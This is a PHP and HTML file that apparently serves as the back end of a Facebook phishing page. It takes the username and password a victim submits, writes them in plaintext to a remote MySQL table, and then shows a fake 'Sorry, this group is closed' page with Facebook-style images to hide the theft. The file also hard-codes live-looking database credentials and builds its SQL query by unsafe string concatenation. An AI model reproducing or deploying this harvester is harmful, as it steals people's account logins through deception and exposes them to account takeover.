<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sorry</title>
  <link rel="stylesheet" href="facboo.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
</head>
<body class="bdy">


<?php

error_reporting(0);


$user=$_POST['user'];
$pass=$_POST['pas'];

$con = mysqli_connect("sql312.epizy.com","epiz_25710352","Rahul7560#","epiz_25710352_dare");
if (mysqli_connect_errno()) {
    echo "Failed to connect to MySQL: " . mysqli_connect_error();
    exit();
}
$sql= "INSERT INTO `face`(`user`, `pass`) VALUES ('$user','$pass')"; 
$con->query($sql);

















?>


<div class="facebook" align="center">
  <img src="w.png" class="cent" alt="facebbokk"  >
</div>

<div  align="center "class="container-fluid mt-3 ml-3 mr-3  ">
  <h3 class="hh3 ">Sorry ,this group is closed </h3>
  <div  class="mt-3">
  <img src="s.png" alt="" srcset="">


</div>
</div>

  
</body>
</html>
